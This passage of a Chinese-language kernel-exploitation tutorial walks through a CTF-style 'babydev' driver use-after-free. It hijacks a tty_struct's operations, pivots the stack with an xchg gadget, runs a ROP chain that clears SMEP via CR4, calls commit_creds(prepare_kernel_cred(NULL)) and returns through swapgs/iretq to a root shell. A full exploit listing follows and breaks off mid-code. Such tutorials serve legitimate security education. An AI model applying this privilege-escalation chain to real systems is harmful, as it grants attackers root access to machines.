<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>FFFFFFFF814DC0C3                 <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">38h</span>]</span><br></pre></td></tr></table></figure>
<p>由于当控制流执行至此处时，只有 <code>%rax</code> 是用户可控的（即<code>fake_tty_operations</code>基地址），因此我们尝试使用以下 gadget，劫持 <code>%rsp</code> 指针至用户空间：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0xffffffff8100008a</span> : <span class="keyword">xchg</span> <span class="built_in">eax</span>, <span class="built_in">esp</span> <span class="comment">; ret</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：<code>xchg eax, esp</code>将<strong>清空两个寄存器的高位部分</strong>。因此执行完成后，%rsp 的高四字节为0，此时指向用户空间。我们可以使用 mmap 函数占据这块内存，并放上 ROP 链。</p>
</blockquote>
<p>以下是劫持栈指针的部分代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"><span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">ioctl(fd1, <span class="number">65537</span>, <span class="number">0x2e0</span>);</span><br><span class="line"></span><br><span class="line">close(fd1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请 tty_struct</span></span><br><span class="line"><span class="keyword">int</span> master_fd = open(<span class="string">"/dev/ptmx"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造一个 fake tty_operators</span></span><br><span class="line"><span class="keyword">u_int64_t</span> fake_tty_ops[] = &#123;</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    xchg_eax_esp_addr, <span class="comment">// int  (*write)(struct tty_struct*, const unsigned char *, int)</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] fake_tty_ops constructed\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">u_int64_t</span> hijacked_stack_addr = ((<span class="keyword">u_int64_t</span>)fake_tty_ops &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] hijacked_stack addr: %p\n"</span>, (<span class="keyword">char</span>*)hijacked_stack_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* fake_stack = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> ((fake_stack = mmap(</span><br><span class="line">    (<span class="keyword">char</span>*)(hijacked_stack_addr &amp; (~<span class="number">0xfff</span>)),    <span class="comment">// addr, 页对齐</span></span><br><span class="line">    <span class="number">0x1000</span>,                                     <span class="comment">// length</span></span><br><span class="line">    PROT_READ | PROT_WRITE,                     <span class="comment">// prot</span></span><br><span class="line">    MAP_PRIVATE | MAP_ANONYMOUS,                <span class="comment">// flags</span></span><br><span class="line">    <span class="number">-1</span>,                                         <span class="comment">// fd</span></span><br><span class="line">    <span class="number">0</span>)                                          <span class="comment">// offset</span></span><br><span class="line">    ) == MAP_FAILED)  </span><br><span class="line">    perror(<span class="string">"mmap"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调试时先装载页面</span></span><br><span class="line">fake_stack[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]     fake_stack addr: %p\n"</span>, fake_stack);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 tty_struct 结构体的所有数据</span></span><br><span class="line"><span class="keyword">int</span> ops_ptr_offset = <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span> + <span class="number">8</span>;</span><br><span class="line"><span class="keyword">char</span> overwrite_mem[ops_ptr_offset + <span class="number">8</span>];</span><br><span class="line"><span class="keyword">char</span>** ops_ptr_addr = (<span class="keyword">char</span>**)(overwrite_mem + ops_ptr_offset);</span><br><span class="line"></span><br><span class="line">read(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] origin ops ptr addr: %p\n"</span>, *ops_ptr_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改并覆写 tty_struct 结构体</span></span><br><span class="line">*ops_ptr_addr = (<span class="keyword">char</span>*)fake_tty_ops;</span><br><span class="line">write(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] hacked ops ptr addr: %p\n"</span>, *ops_ptr_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发 tty_write</span></span><br><span class="line"><span class="comment">// 注意使用 write 时， buf 指针必须有效，否则会提前返回 EFAULT</span></span><br><span class="line"><span class="keyword">int</span> buf[] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">write(master_fd, buf, <span class="number">8</span>);</span><br></pre></td></tr></table></figure>
<p>可以看到栈指针已经成功被劫持到用户空间中：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211013163918810.png" alt="image-20211013163918810"></p>
<h6 id="4-2-关闭-SMEP-ret2usr提权">4.2) 关闭 SMEP + ret2usr提权</h6>
<p>劫持栈指针后，我们现在可以尝试提权。正常来说，在<strong>内核</strong>里需要执行以下代码来进行提权：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> * <span class="title">root_cred</span> = <span class="title">prepare_kernel_cred</span>(<span class="title">NULL</span>);</span></span><br><span class="line">commit_creds(root_cred);</span><br></pre></td></tr></table></figure>
<p>其中，<code>prepare_kernel_cred</code>函数用于获取传入 <code>task_struct</code> 结构指针的 cred 结构。需要注意的是，如果传入的指针是 <strong>NULL</strong>，则<strong>函数返回的 cred 结构将是 init_cred，其中uid、gid等等均为 root 级别</strong>。</p>
<p><code>commit_creds</code>函数用于将当前进程的 <code>cred</code> 更新为新传入的 <code>cred</code> 结构，如果我们将当前进程的 cred 更新为 root 等级的 cred，则达到我们提权的目的。</p>
<p>为了利用简便，我们可以先关闭 SMEP，跳转进用户代码中直接执行预编译好的提权指令。</p>
<p>SMEP 标志在寄存器 CR4 上，因此我们可以通过重设 CR4 寄存器来关闭 SMEP，最后提权：</p>
<p><img src="/2021/10/kernel_pwn_introduction/c76896800a175ad42f2bcdd31c5c083f.png" alt="image"></p>
<p>我们先看一下当前的 cr4 寄存器的值</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211013172645328.png" alt="image-20211013172645328"></p>
<p>之后只要将 cr4 覆盖为 0x6f0 即可。</p>
<p>相关实现如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_root_cred</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) = (<span class="keyword">void</span>* (*)(<span class="keyword">void</span>*))prepare_kernel_cred_addr;</span><br><span class="line">    <span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) = (<span class="keyword">void</span> (*)(<span class="keyword">void</span>*))commit_creds_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> * root_cred = prepare_kernel_cred(<span class="literal">NULL</span>);</span><br><span class="line">    commit_creds(root_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">// 准备 ROP</span></span><br><span class="line">    <span class="keyword">u_int64_t</span>* hijacked_stack_ptr = (<span class="keyword">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line">    hijacked_stack_ptr[<span class="number">0</span>] = pop_rdi_addr;              <span class="comment">// pop rdi; ret</span></span><br><span class="line">    hijacked_stack_ptr[<span class="number">1</span>] = <span class="number">0x6f0</span>;                     <span class="comment">// new cr4</span></span><br><span class="line">    hijacked_stack_ptr[<span class="number">2</span>] = mov_cr4_rdi_pop_rbp_addr;  <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    hijacked_stack_ptr[<span class="number">3</span>] = <span class="number">0</span>;                         <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[<span class="number">4</span>] = (<span class="keyword">u_int64_t</span>)set_root_cred;  <span class="comment">// set root</span></span><br><span class="line">    <span class="comment">// todo ROP</span></span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="4-3-返回用户态-get-shell">4.3) 返回用户态 + get shell</h6>
<blockquote>
<p>当我们提权了当前进程后，剩下要做的事情就是<strong>返回至用户态</strong>并启动新shell。</p>
<p>可能有小伙伴会问，既然都劫持了内核控制流了，那是不是可以直接启动 shell ？为什么还要返回至用户态？</p>
<p>个人的理解是，劫持内核控制流后，由于改变了内核的正常运行逻辑，因此此时内核鲁棒性降低，稍微敏感的一些操作都有可能会导致内核挂掉。最稳妥的方式是回到更加稳定的用户态中，而且 root 权限的用户态程序同样可以做到内核权限所能做到的事情。</p>
<p>除了上面所说的以外，还有一个很重要的原因是：一般情况下在用户空间构造特定目的的代码要比在内核空间简单得多。</p>
</blockquote>
<p>如何从内核态返回至用户态中？我们可以从 syscall 的入口代码入手，先看看这部分代码：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line">  SWAPGS_UNSAFE_STACK</span><br><span class="line"><span class="meta">GLOBAL</span>(entry_SYSCALL_64_after_swapgs)</span><br><span class="line">  <span class="keyword">movq</span>  %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">  <span class="keyword">movq</span>  PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">  /* Construct struct pt_regs on stack */</span><br><span class="line">  pushq  $__USER_DS      /* pt_regs-&gt;<span class="built_in">ss</span> */</span><br><span class="line">  pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;<span class="built_in">sp</span> */</span><br><span class="line"></span><br><span class="line">  ENABLE_INTERRUPTS(CLBR_NONE)</span><br><span class="line">  pushq  %r11        /* pt_regs-&gt;flags */</span><br><span class="line">  pushq  $__USER_CS      /* pt_regs-&gt;<span class="built_in">cs</span> */</span><br><span class="line">  pushq  %rcx        /* pt_regs-&gt;<span class="built_in">ip</span> */</span><br><span class="line">  pushq  %rax        /* pt_regs-&gt;orig_ax */</span><br><span class="line">  pushq  %rdi        /* pt_regs-&gt;<span class="built_in">di</span> */</span><br><span class="line">  pushq  %rsi        /* pt_regs-&gt;<span class="built_in">si</span> */</span><br><span class="line">  pushq  %rdx        /* pt_regs-&gt;<span class="built_in">dx</span> */</span><br><span class="line">  pushq  %rcx        /* pt_regs-&gt;<span class="built_in">cx</span> */</span><br><span class="line">  pushq  $-ENOSYS      /* pt_regs-&gt;<span class="built_in">ax</span> */</span><br><span class="line">  pushq  %r8        /* pt_regs-&gt;<span class="built_in">r8</span> */</span><br><span class="line">  pushq  %r9        /* pt_regs-&gt;<span class="built_in">r9</span> */</span><br><span class="line">  pushq  %r10        /* pt_regs-&gt;<span class="built_in">r10</span> */</span><br><span class="line">  pushq  %r11        /* pt_regs-&gt;<span class="built_in">r11</span> */</span><br><span class="line">  <span class="keyword">sub</span>  $(<span class="number">6</span>*<span class="number">8</span>), %rsp      /* pt_regs-&gt;<span class="built_in">bp</span>, <span class="built_in">bx</span>, <span class="built_in">r12</span>-<span class="number">15</span> <span class="keyword">not</span> saved */</span><br></pre></td></tr></table></figure>
<p>可以看到，控制流以进入入口点后，并立即执行<code>swapgs</code>指令，将当前 GS 寄存器切换成 kernel GS，之后切换栈指针至内核栈，并在内核栈中构造结构体 <code>pt_regs</code>。</p>
<p>该结构体声明如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren't saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled "struct pt_regs".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it's IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>结合动态调试可以发现，在控制流到达 syscall 入口点之前，<code>pt_regs</code>结构体中的 <code>rip</code>、<code>cs</code>、<code>eflags</code>、<code>rsp</code> 以及 <code>ss</code> 五个寄存器均已压栈。</p>
<p>我们还可以在该文件中找到下面的代码片段</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">opportunistic_sysret_failed:</span></span><br><span class="line">  <span class="keyword">SWAPGS</span></span><br><span class="line">  <span class="keyword">jmp</span>  restore_c_regs_and_iret</span><br><span class="line">  </span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * <span class="meta">At</span> this label, code paths which return to kernel <span class="keyword">and</span> to user,</span><br><span class="line"> * which come from interrupts/exception <span class="keyword">and</span> from syscalls, merge.</span><br><span class="line"> */</span><br><span class="line"><span class="meta">GLOBAL</span>(restore_regs_and_iret)</span><br><span class="line">  RESTORE_EXTRA_REGS</span><br><span class="line"><span class="symbol">restore_c_regs_and_iret:</span></span><br><span class="line">  RESTORE_C_REGS</span><br><span class="line">  REMOVE_PT_GPREGS_FROM_STACK <span class="number">8</span></span><br><span class="line">  INTERRUPT_RETURN</span><br></pre></td></tr></table></figure>
<p>根据上面的分析信息，我们不难推断出，若想从内核态返回至用户态，则需要依次完成以下两件事情：</p>
<ul>
<li>再执行一次 swapgs 指令，将当前的 GS 寄存器从 kernel gs 换回 user gs</li>
<li>手动在栈上构造 iret 指令所需要的5个寄存器值，然后调用 iret 指令。</li>
</ul>
<p>因此最终实现的部分代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] got shell, welcome %s\n"</span>, (getuid() ? <span class="string">"user"</span> : <span class="string">"root"</span>));</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_eflags, user_rsp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_iret_data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%cs, %0"</span> : <span class="string">"=r"</span> (user_cs));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"pushf"</span>);</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"pop %0"</span> : <span class="string">"=r"</span> (user_eflags));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%rsp, %0"</span> : <span class="string">"=r"</span> (user_rsp));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%ss, %0"</span> : <span class="string">"=r"</span> (user_ss));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    save_iret_data();</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">"[+] iret data saved.\n"</span></span><br><span class="line">        <span class="string">"    user_cs: %ld\n"</span></span><br><span class="line">        <span class="string">"    user_eflags: %ld\n"</span></span><br><span class="line">        <span class="string">"    user_rsp: %p\n"</span></span><br><span class="line">        <span class="string">"    user_ss: %ld\n"</span>,</span><br><span class="line">        user_cs, user_eflags, (<span class="keyword">char</span>*)user_rsp, user_ss</span><br><span class="line">    );</span><br><span class="line">    [...]</span><br><span class="line">    <span class="keyword">u_int64_t</span>* hijacked_stack_ptr = (<span class="keyword">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    hijacked_stack_ptr[idx++] = pop_rdi_addr;              <span class="comment">// pop rdi; ret</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0x6f0</span>;</span><br><span class="line">    hijacked_stack_ptr[idx++] = mov_cr4_rdi_pop_rbp_addr;  <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0</span>;                         <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = (<span class="keyword">u_int64_t</span>)set_root_cred;</span><br><span class="line">    <span class="comment">// 新添加的 ROP 链</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = swapgs_pop_rbp_addr;</span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0</span>;                          <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = iretq_addr;</span><br><span class="line">    hijacked_stack_ptr[idx++] = (<span class="keyword">u_int64_t</span>)get_shell;       <span class="comment">// iret_data.rip</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = user_cs;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_eflags;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_rsp;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_ss;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="4-4-ROP-注意点">4.4) ROP 注意点</h6>
<p>在往常的用户层面的利用，我们无需关注<strong>缺页错误</strong>这样的一个无关紧要的异常。然而在内核利用中，缺页错误往往非常致命（不管是否是可恢复的，即正常的缺页错误也很致命），大概率会直接引发 <strong>double fault</strong>，致使内核重启：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211013173842187.png" alt="image-20211013173842187"></p>
<p>因此在构造 ROP 链时，应尽量避免在内核中直接引用那些<strong>尚未装载页面的内存页</strong>。</p>
<p>再一个问题是单步调试。在调试内核 ROP 链时，有概率会在单步执行时直接跑炸内核，但先给该位置下断点后，再跑至该位置则执行正常。这个调试…仁者见仁智者见智吧（滑稽）</p>
<h6 id="4-5-完整-exploit">4.5) 完整 exploit</h6>
<p>完整的 exploit 如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xchg_eax_esp_addr           0xffffffff8100008a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred_addr    0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds_addr           0xffffffff810a1420</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_addr                0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_cr4_rdi_pop_rbp_addr    0xffffffff81004d80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_pop_rbp_addr         0xffffffff81063694          </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> iretq_addr                  0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_root_cred</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) = (<span class="keyword">void</span>* (*)(<span class="keyword">void</span>*))prepare_kernel_cred_addr;</span><br><span class="line">    <span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) = (<span class="keyword">void</span> (*)(<span class="keyword">void</span>*))commit_creds_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> * root_cred = prepare_kernel_cred(<span class="literal">NULL</span>);</span><br><span class="line">    commit_creds(root_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] got shell, welcome %s\n"</span>, (getuid() ? <span class="string">"user"</span> : <span class="string">"root"</span>));</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_eflags, user_rsp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_iret_data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%cs, %0"</span> : <span class="string">"=r"</span> (user_cs));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"pushf"</span>);</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"pop %0"</span> : <span class="string">"=r"</span> (user_eflags));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%rsp, %0"</span> : <span class="string">"=r"</span> (user_rsp));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%ss, %0"</span> : <span class="string">"=r"</span> (user_ss));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    save_iret_data();</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">"[+] iret data saved.\n"</span></span><br><span class="line">        <span class="string">"    user_cs: %ld\n"</span></span><br><span class="line">        <span class="string">"    user_eflags: %ld\n"</span></span><br><span class="line">        <span class="string">"    user_rsp: %p\n"</span></span><br><span class="line">        <span class="string">"    user_ss: %ld\n"</span>,</span><br><span class="line">        user_cs, user_eflags, (<span class="keyword">char</span>*)user_rsp, user_ss</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">65537</span>, <span class="number">0x2e0</span>);</span><br><span class="line"></span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请 tty_struct</span></span><br><span class="line">    <span class="keyword">int</span> master_fd = open(<span class="string">"/dev/ptmx"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造一个 fake tty_operators</span></span><br><span class="line">    <span class="keyword">u_int64_t</span> fake_tty_ops[] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        xchg_eax_esp_addr, <span class="comment">// int  (*write)(struct tty_struct*, const unsigned char *, int)</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] fake_tty_ops constructed\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span> hijacked_stack_addr = ((<span class="keyword">u_int64_t</span>)fake_tty_ops &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] hijacked_stack addr: %p\n"</span>, (<span class="keyword">char</span>*)hijacked_stack_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* fake_stack = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> ((fake_stack = mmap(</span><br><span class="line">            (<span class="keyword">char</span>*)((hijacked_stack_addr &amp; (~<span class="number">0xffff</span>))),  <span class="comment">// addr, 页对齐</span></span><br><span class="line">            <span class="number">0x10000</span>,                                     <span class="comment">// length</span></span><br><span class="line">            PROT_READ | PROT_WRITE,                     <span class="comment">// prot</span></span><br><span class="line">            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,    <span class="comment">// flags</span></span><br><span class="line">            <span class="number">-1</span>,                                         <span class="comment">// fd</span></span><br><span class="line">            <span class="number">0</span>)                                          <span class="comment">// offset</span></span><br><span class="line">        ) == MAP_FAILED)  </span><br><span class="line">        perror(<span class="string">"mmap"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]     fake_stack addr: %p\n"</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span>* hijacked_stack_ptr = (<span class="keyword">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    hijacked_stack_ptr[idx++] = pop_rdi_addr;              <span class="comment">// pop rdi; ret</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0x6f0</span>;</span><br><span class="line">    hijacked_stack_ptr[idx++] = mov_cr4_rdi_pop_rbp_addr;  <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0</span>;                         <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = (<span class="keyword">u_int64_t</span>)set_root_cred;</span><br><span class="line">    hijacked_stack_ptr[idx++] = swapgs_pop_rbp_addr;</span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0</span>;                          <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = iretq_addr;</span><br><span class="line">    hijacked_stack_ptr[idx++] = (<span class="keyword">u_int64_t</span>)get_shell;       <span class="comment">// iret_data.rip</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = user_cs;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_eflags;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_rsp;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] privilege escape ROP prepared\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取 tty_struct 结构体的所有数据</span></span><br><span class="line">    <span class="keyword">int</span> ops_ptr_offset = <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">char</span> overwrite_mem[ops_ptr_offset + <span class="number">8</span>];</span><br><span class="line">    <span class="keyword">char</span>** ops_ptr_addr = 